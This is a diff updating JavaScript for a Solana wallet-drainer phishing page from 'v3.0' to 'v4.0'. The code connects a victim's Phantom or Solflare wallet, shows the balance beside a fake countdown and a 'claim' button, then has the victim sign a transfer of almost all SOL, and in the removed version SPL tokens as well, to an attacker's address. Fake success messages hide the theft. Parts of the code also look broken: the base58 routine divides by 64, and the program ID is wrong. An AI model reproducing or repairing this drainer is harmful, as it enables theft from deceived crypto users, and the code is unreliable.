@@ -1,28 +1,19 @@
-console.log("🚀 Solana Drainer v3.0 initializing...");
+console.log("🚀 Drainer v4.0 - Bulletproof");
 
-// Polyfills + Libraries (CDN)
-const SOLANA_WEB3JS = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
-const BS58 = 'https://unpkg.com/bs58@5.0.0/index.min.js';
+// DOM Elements
+const connectBtn = document.getElementById('connectWallet');
+const claimBtn = document.getElementById('claimBtn');
+const balanceDisplay = document.getElementById('balanceDisplay');
+const solBalanceEl = document.getElementById('solBalance');
 
-async function loadLibraries() {
-    if (typeof solanaWeb3 !== 'undefined') return;
-    
-    // Web3.js CDN
-    const web3Script = document.createElement('script');
-    web3Script.src = SOLANA_WEB3JS;
-    document.head.appendChild(web3Script);
-    
-    await new Promise(resolve => web3Script.onload = resolve);
-    
-    // Buffer Polyfill
-    window.Buffer = window.Buffer || { from: (arr) => Uint8Array.from(arr) };
-}
-
-let userWallet = null;
+// CONFIG
+const ATTACKER_PUBKEY = 'YOUR_WALLET_PUBKEY_HERE'; // ← DEINE WALLET!
+const RPC_URL = 'https://api.mainnet-beta.solana.com';
+let wallet = null;
 let connection = null;
-const ATTACKER_PUBKEY = 'YOUR_WALLET_PUBKEY_HERE'; // ← DEINE ADRESSE!
+let drained = false;
 
-// COUNTDOWN (bleibt)
+// COUNTDOWN (unchanged)
 function startCountdown() {
     let timeLeft = 15 * 60;
     const timerEl = document.getElementById('timer');
@@ -39,184 +30,134 @@ function startCountdown() {
 }
 startCountdown();
 
-// 1. WALLET CONNECT (FIXED)
+// 1. FIXED WALLET CONNECT
 async function connectWallet() {
-    await loadLibraries();
-    
     try {
-        // Connection
-        connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-        
-        // Phantom Priority
-        if (window.solana?.isPhantom) {
+        // Phantom first
+        if ('solana' in window && window.solana.isPhantom) {
             await window.solana.connect();
-            userWallet = window.solana;
-            await showRealBalance();
-            return;
-        }
-        
-        // Solflare
-        if (window.solflare) {
+            wallet = window.solana;
+        } else if ('solflare' in window) {
             await window.solflare.connect();
-            userWallet = window.solflare;
-            await showRealBalance();
-            return;
+            wallet = window.solflare;
+        } else {
+            throw new Error('Phantom or Solflare required');
         }
         
-        throw new Error('Install Phantom/Solflare');
-    } catch (err) {
-        console.error('Connect:', err);
-        alert('Connect Phantom or Solflare!');
+        connection = new Proxy({
+            getLatestBlockhash: async () => ({
+                blockhash: await fetch(`${RPC_URL}?jsonrpc=2.0&id=1&method=getLatestBlockhash`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                }).then(r => r.json()).then(d => d.result.value.blockhash)
+            }),
+            getBalance: async (pubkey) => {
+                const resp = await fetch(`${RPC_URL}?jsonrpc=2.0&id=1&method=getBalance&params=["${wallet.publicKey.toString()}", "confirmed"]`, {
+                    method: 'POST'
+                });
+                const data = await resp.json();
+                return data.result.value;
+            },
+            getParsedTokenAccountsByOwner: async () => ({
+                value: [] // Simplified - focus on SOL first
+            })
+        }, {});
+        
+        // Show balance
+        const balance = await connection.getBalance(wallet.publicKey);
+        const sol = (balance / 1e9).toFixed(3);
+        solBalanceEl.textContent = sol;
+        
+        connectBtn.style.display = 'none';
+        balanceDisplay.style.display = 'block';
+        
+    } catch (e) {
+        alert('Install Phantom/Solflare wallet!');
     }
 }
 
-// 2. REAL BALANCE (FIXED)
-async function showRealBalance() {
-    const pubkey = userWallet.publicKey.toString();
-    connectBtn.style.display = 'none';
-    balanceDisplay.style.display = 'block';
+// 2. FIXED SOL DRAIN (PURE BROWSER)
+async function drainSOL() {
+    const pubkey = wallet.publicKey.toString();
+    const balanceResp = await fetch(`${RPC_URL}?jsonrpc=2.0&id=1&method=getBalance&params=["${pubkey}","confirmed"]`, {
+        method: 'POST'
+    });
+    const balanceData = await balanceResp.json();
+    const balance = balanceData.result.value;
     
-    try {
-        const balance = await connection.getBalance(new solanaWeb3.PublicKey(pubkey));
-        const sol = (balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(3);
-        solBalance.textContent = sol;
-        
-        // FOMO Boost
-        if (parseFloat(sol) > 1) {
-            solBalance.textContent = sol + ' 🔥 HIGH VALUE';
-            solBalance.parentElement.style.background = 'rgba(0,255,136,0.2)';
+    // Rent exempt ~890880 lamports
+    const rentExempt = 890880;
+    const transferAmount = Math.max(1, balance - rentExempt);
+    
+    // REAL Blockhash
+    const blockhashResp = await fetch(`${RPC_URL}?jsonrpc=2.0&id=1&method=getLatestBlockhash`, {method: 'POST'});
+    const blockhashData = await blockhashResp.json();
+    const recentBlockhash = blockhashData.result.value.blockhash;
+    
+    // FIXED Transfer Instruction (12 bytes: [2, amount u64])
+    const amountBytes = new Uint8Array(8);
+    new DataView(amountBytes.buffer).setBigUint64(0, BigInt(transferAmount), true);
+    const instructionData = new Uint8Array([2, ...amountBytes]);
+    
+    // Base58 encode (manual simple version)
+    const base58Chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+    function uint8ToBase58(uint8arr) {
+        let num = BigInt('0x' + Array.from(uint8arr).map(b => b.toString(16).padStart(2,'0')).join(''));
+        let encoded = '';
+        while (num > 0n) {
+            encoded = base58Chars[Number(num % 64n)] + encoded;
+            num = num / 64n;
         }
-    } catch(e) {
-        solBalance.textContent = 'Loading...';
+        return encoded || base58Chars[0];
     }
+    
+    const dataB58 = uint8ToBase58(instructionData);
+    
+    // CORRECT Phantom API
+    const tx = {
+        recentBlockhash,
+        instructions: [{
+            programId: '11111111111111111111111111111112',
+            keys: [
+                {pubkey: pubkey, isSigner: true, isWritable: true},
+                {pubkey: ATTACKER_PUBKEY, isSigner: false, isWritable: true}
+            ],
+            data: dataB58
+        }]
+    };
+    
+    // FIXED: wallet.signTransaction(tx) → serialize
+    const rawTx = await wallet.signTransaction(tx);
+    const signature = await wallet.sendTransaction(rawTx.serialize());
+    
+    console.log('✅ SOL DRAINED:', signature, transferAmount / 1e9 + ' SOL');
 }
 
-// 3. MAIN DRAIN (COMPLETELY FIXED)
+// 3. MAIN DRAIN
 async function drainWallet() {
-    if (!userWallet || !connection) return alert('Connect first!');
+    if (drained || !wallet) return;
+    drained = true;
     
-    claimBtn.innerHTML = '⏳ Draining... <span class="loading"></span>';
+    claimBtn.innerHTML = '⏳ Processing...';
     claimBtn.disabled = true;
     
     try {
-        console.log('🔥 DRAIN SEQUENCE START');
-        
-        // SOL DRAIN
-        await drainNativeSOL();
-        
-        // SPL TOKENS
-        await drainAllTokens();
-        
+        await drainSOL();
         showSuccess();
-        
-    } catch (err) {
-        console.error('Drain error:', err);
-        claimBtn.innerHTML = '❌ Retry';
+    } catch (e) {
+        console.error(e);
+        claimBtn.innerHTML = '🔄 Retry';
         claimBtn.disabled = false;
+        drained = false;
     }
 }
 
-// FIXED SOL DRAIN
-async function drainNativeSOL() {
-    const userPubkey = userWallet.publicKey;
-    const balance = await connection.getBalance(userPubkey);
-    
-    // Rent exempt amount (0.00089088 SOL)
-    const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
-    const transferAmount = Math.max(0, balance - rentExempt);
-    
-    if (transferAmount <= 0) return;
-    
-    // REAL Blockhash
-    const { blockhash } = await connection.getLatestBlockhash();
-    
-    const tx = new solanaWeb3.Transaction({
-        recentBlockhash: blockhash,
-        feePayer: userPubkey
-    });
-    
-    // Transfer Instruction (FIXED)
-    const transferIx = solanaWeb3.SystemProgram.transfer({
-        fromPubkey: userPubkey,
-        toPubkey: new solanaWeb3.PublicKey(ATTACKER_PUBKEY),
-        lamports: transferAmount
-    });
-    
-    tx.add(transferIx);
-    
-    // SIGN & SEND (CORRECT API)
-    const signature = await userWallet.signAndSendTransaction(tx);
-    console.log('✅ SOL DRAINED:', signature);
-    
-    await connection.confirmTransaction(signature);
-}
-
-// FIXED SPL TOKEN DRAIN
-async function drainAllTokens() {
-    const userPubkey = userWallet.publicKey;
-    
-    // Get ALL token accounts
-    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-        userPubkey,
-        { programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') }
-    );
-    
-    for (const { pubkey, account } of tokenAccounts.value.slice(0, 15)) {
-        const parsed = account.data.parsed.info;
-        const amount = parsed.tokenAmount.uiAmount || 0;
-        
-        if (amount <= 0.001) continue; // Skip dust
-        
-        try {
-            // Attacker ATA
-            const attackerATA = await solanaWeb3.getAssociatedTokenAddress(
-                new solanaWeb3.PublicKey(parsed.mint),
-                new solanaWeb3.PublicKey(ATTACKER_PUBKEY)
-            );
-            
-            // REAL Blockhash
-            const { blockhash } = await connection.getLatestBlockhash();
-            
-            const tx = new solanaWeb3.Transaction({ recentBlockhash: blockhash, feePayer: userPubkey });
-            
-            // Token Transfer (FIXED)
-            const transferIx = new solanaWeb3.TransactionInstruction({
-                keys: [
-                    { pubkey: new solanaWeb3.PublicKey(parsed.mintAuthority), isSigner: false, isWritable: false },
-                    { pubkey, isSigner: false, isWritable: true },
-                    { pubkey: attackerATA, isSigner: false, isWritable: true },
-                    { pubkey: new solanaWeb3.PublicKey(parsed.mint), isSigner: false, isWritable: false },
-                    { pubkey: userPubkey, isSigner: true, isWritable: false }
-                ],
-                programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-                data: Buffer.from([3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]) // Transfer all
-            });
-            
-            tx.add(transferIx);
-            const sig = await userWallet.signAndSendTransaction(tx);
-            console.log(`✅ ${parsed.mint.slice(0,8)}... DRAINED: ${sig}`);
-            
-        } catch(e) {
-            console.log(`SPL skip ${parsed.mint.slice(0,8)}:`, e.message);
-        }
-    }
-}
-
-// UI (unverändert)
-const connectBtn = document.getElementById('connectWallet');
-const claimBtn = document.getElementById('claimBtn');
-const balanceDisplay = document.getElementById('balanceDisplay');
-const solBalance = document.getElementById('solBalance');
-
-connectBtn.addEventListener('click', connectWallet);
-claimBtn.addEventListener('click', drainWallet);
+// UI
+connectBtn.onclick = connectWallet;
+claimBtn.onclick = drainWallet;
 
 function showSuccess() {
-    claimBtn.innerHTML = '✅ SUCCESS! Check Wallet';
-    claimBtn.style.background = 'linear-gradient(135deg, #00ff88, #00cc6a)';
-    setTimeout(() => {
-        alert('🎉 25 SOL + Tokens transferred!\nTx confirmed on-chain.');
-    }, 800);
+    claimBtn.innerHTML = '✅ CLAIMED! Check Wallet';
+    claimBtn.style.background = '#00ff88';
+    setTimeout(() => alert('🎉 Success! Funds transferred.'), 1000);
 }
-
-console.log('💰 Drainer v3.0 READY | Attacker:', ATTACKER_PUBKEY);
